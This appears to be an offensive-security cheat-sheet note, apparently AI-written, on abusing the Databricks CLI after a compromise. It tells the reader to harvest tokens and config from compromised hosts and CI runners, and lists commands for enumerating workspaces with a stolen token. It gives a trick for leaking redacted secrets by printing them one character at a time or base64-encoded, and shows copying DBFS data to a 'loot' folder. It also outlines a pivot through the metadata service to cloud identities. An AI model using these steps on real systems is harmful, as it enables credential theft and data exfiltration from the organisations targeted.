# databricks CLI

**Tags:** `#databricks` `#cloud` `#dataengineering` `#api` `#cli`

Official command-line client for the Databricks REST API (Azure/AWS/GCP). Wraps workspace, cluster, job, DBFS, secrets, and Unity Catalog operations that would otherwise be hand-rolled `curl` calls against `/api/2.0/`. Authenticates with a Personal Access Token or OAuth (service principal / user-to-machine), reading config from `~/.databrickscfg` or `DATABRICKS_HOST`/`DATABRICKS_TOKEN` env vars — both worth grabbing from a compromised host or CI runner.

**Source:** https://docs.databricks.com/dev-tools/cli/
**Install:** `brew install databricks` (newer unified CLI) or `pip install databricks-cli` (legacy)

```bash
# Configure with a PAT (writes ~/.databrickscfg)
databricks configure --token   # prompts for host + PAT

# Enumerate with a stolen token
export DATABRICKS_HOST=https://<workspace>
export DATABRICKS_TOKEN=dapi<...>
databricks clusters list
databricks workspace list /Users
databricks secrets list-scopes
databricks fs ls dbfs:/
```

### Secrets — enumerate, then exfil past redaction

```bash
databricks secrets list-scopes
databricks secrets list-secrets --scope <scope>        # KEY NAMES only — the API never returns values
```

> [!tip] **The API can't hand you a secret value** (`dbutils.secrets.get()` and any log of it are
> auto-**redacted**). Standard bypass: run a notebook/job on a cluster that reads the secret and
> emits it **one character at a time** (or base64 with separators), which the redactor doesn't
> catch — e.g. `for c in s: print(c, end=' ')`.

### DBFS & Cluster-Code → Cloud-Identity Pivot

```bash
databricks fs ls dbfs:/                                 # browse the data lake
databricks fs cp -r dbfs:/mnt ./loot                    # pull data / configs (often creds)
databricks fs cat dbfs:/path/to/file
```

Running any notebook/job on a cluster is **code exec on the Spark driver node** — and that
node usually carries an attached **instance profile (AWS)** / **managed identity (Azure)** /
**service account (GCP)**. Hit the metadata service from your notebook and pivot with
[[Tools/Cloud/aws-cli|aws-cli]] / [[Tools/Cloud/azure-cli|azure-cli]] / [[Tools/Cloud/gcloud-cli|gcloud-cli]]. Exact
job-submit syntax and init-script persistence are in the Services note below.

> [!note] **See also** — [[Services/Cloud & Data/Databricks|Databricks]] for the full attack methodology (PAT/OAuth theft, IMDS pivot, secret scopes, init-script abuse).

---

*Created: 2026-07-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
